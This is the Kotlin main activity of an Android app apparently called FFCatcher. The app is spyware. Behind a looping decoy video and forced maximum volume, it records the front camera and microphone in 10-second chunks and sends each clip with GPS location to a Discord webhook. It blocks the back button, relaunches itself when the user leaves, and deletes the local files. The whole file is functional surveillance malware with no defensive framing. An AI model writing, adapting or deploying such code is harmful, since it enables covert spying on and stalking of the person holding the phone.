package com.bluezy.ffcatcher

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.view.WindowManager
import android.widget.Toast
import android.widget.VideoView
import androidx.appcompat.app.AppCompatActivity
import androidx.camera.core.CameraSelector
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.video.FallbackStrategy
import androidx.camera.video.FileOutputOptions
import androidx.camera.video.Quality
import androidx.camera.video.QualitySelector
import androidx.camera.video.Recorder
import androidx.camera.video.Recording
import androidx.camera.video.VideoCapture
import androidx.camera.video.VideoRecordEvent
import androidx.camera.view.PreviewView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "FFCatcher"
        private const val PERM_REQ = 1001
        private const val CHUNK_MS = 10_000L
    }

    private lateinit var introVideo: VideoView
    private lateinit var previewView: PreviewView

    private var cameraProvider: ProcessCameraProvider? = null
    private var videoCapture: VideoCapture<Recorder>? = null
    private var recording: Recording? = null

    private val scope = CoroutineScope(Dispatchers.Main + Job())

    private val permissions = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        introVideo  = findViewById(R.id.introVideo)
        previewView = findViewById(R.id.previewView)

        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        window.addFlags(WindowManager.LayoutParams.FLAG_SECURE)

        hideSystemUI()
        forceMaxVolume()
        keepVolumeMax()

        playIntroVideo()
        requestPermissions()
    }

    private fun hideSystemUI() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            window.insetsController?.let {
                it.hide(android.view.WindowInsets.Type.systemBars())
                it.systemBarsBehavior =
                    android.view.WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
            }
        } else {
            @Suppress("DEPRECATION")
            window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_FULLSCREEN
            )
        }
    }

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus) hideSystemUI()
    }

    private fun forceMaxVolume() {
        try {
            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val maxMusic = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
            val maxVoice = am.getStreamMaxVolume(AudioManager.STREAM_VOICE_CALL)
            am.setStreamVolume(AudioManager.STREAM_MUSIC, maxMusic, 0)
            am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, maxVoice, 0)
            am.requestAudioFocus(null, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN)
        } catch (e: Exception) {
            Log.w(TAG, "forceMaxVolume: ${e.message}")
        }
    }

    private fun keepVolumeMax() {
        scope.launch {
            while (true) {
                delay(500)
                try {
                    val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
                    val max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                    if (am.getStreamVolume(AudioManager.STREAM_MUSIC) < max) {
                        am.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0)
                    }
                } catch (_: Exception) {}
            }
        }
    }

    private fun playIntroVideo() {
        try {
            val uri = Uri.parse("android.resource://$packageName/${R.raw.intro}")
            introVideo.setVideoURI(uri)
            introVideo.setOnPreparedListener { mp ->
                mp.isLooping = true
                mp.setVolume(1f, 1f)
                introVideo.start()
            }
            introVideo.setOnErrorListener { _, _, _ ->
                introVideo.postDelayed({ playIntroVideo() }, 1000)
                true
            }
        } catch (e: Exception) {
            Log.e(TAG, "playIntro: ${e.message}")
        }
    }

    private fun requestPermissions() {
        val missing = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isEmpty()) startCaptureFlow()
        else ActivityCompat.requestPermissions(this, missing.toTypedArray(), PERM_REQ)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERM_REQ) startCaptureFlow()
    }

    private fun startCaptureFlow() {
        scope.launch {
            val gps = GpsHelper.getLocation(this@MainActivity)

            val providerFuture = ProcessCameraProvider.getInstance(this@MainActivity)
            providerFuture.addListener({
                try {
                    cameraProvider = providerFuture.get()
                    startRecordingLoop(gps)
                } catch (e: Exception) {
                    Log.e(TAG, "camera init: ${e.message}")
                }
            }, ContextCompat.getMainExecutor(this@MainActivity))
        }
    }

    private fun startRecordingLoop(initialGps: GpsHelper.Location?) {
        scope.launch {
            while (true) {
                val gps = GpsHelper.getLocation(this@MainActivity) ?: initialGps
                val file = createOutputFile()

                recordChunk(file)

                var waited = 0
                while (recording != null && waited < 5000) {
                    delay(200)
                    waited += 200
                }

                withContext(Dispatchers.IO) {
                    try {
                        WebhookSender.sendToDiscord(file, gps, this@MainActivity)
                    } catch (e: Exception) {
                        Log.e(TAG, "send: ${e.message}")
                    }
                    try { file.delete() } catch (_: Exception) {}
                }

                delay(1000)
            }
        }
    }

    private fun createOutputFile(): File {
        val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        return File(cacheDir, "cap_$ts.mp4")
    }

    private fun recordChunk(file: File) {
        val provider = cameraProvider ?: return
        try {
            provider.unbindAll()

            val cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA

            val qualitySelector = QualitySelector.fromOrderedList(
                listOf(Quality.SD, Quality.HD),
                FallbackStrategy.lowerQualityOrHigherThan(Quality.SD)
            )

            val recorder = Recorder.Builder()
                .setQualitySelector(qualitySelector)
                .build()

            val vc = VideoCapture.withOutput(recorder)
            videoCapture = vc

            provider.bindToLifecycle(this, cameraSelector, vc, previewView)

            val outputOptions = FileOutputOptions.Builder(file).build()

            recording = vc.output
                .prepareRecording(this, outputOptions)
                .withAudioEnabled()
                .start(ContextCompat.getMainExecutor(this)) { event ->
                    when (event) {
                        is VideoRecordEvent.Start -> Log.d(TAG, "start: ${file.name}")
                        is VideoRecordEvent.Finalize -> {
                            Log.d(TAG, "finalize: ${file.name} size=${file.length()}")
                            recording = null
                        }
                    }
                }

            scope.launch {
                delay(CHUNK_MS)
                try { recording?.stop() } catch (_: Exception) {}
            }
        } catch (e: Exception) {
            Log.e(TAG, "recordChunk: ${e.message}")
        }
    }

    @Suppress("DEPRECATION")
    override fun onBackPressed() {
        Toast.makeText(this, "กำลังโหลด...", Toast.LENGTH_SHORT).show()
    }

    override fun onUserLeaveHint() {
        super.onUserLeaveHint()
        try {
            val i = Intent(this, MainActivity::class.java)
            i.addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK
                or Intent.FLAG_ACTIVITY_SINGLE_TOP
                or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
            )
            startActivity(i)
        } catch (_: Exception) {}
    }

    override fun onDestroy() {
        super.onDestroy()
        try { recording?.stop() } catch (_: Exception) {}
        try { cameraProvider?.unbindAll() } catch (_: Exception) {}
    }
}
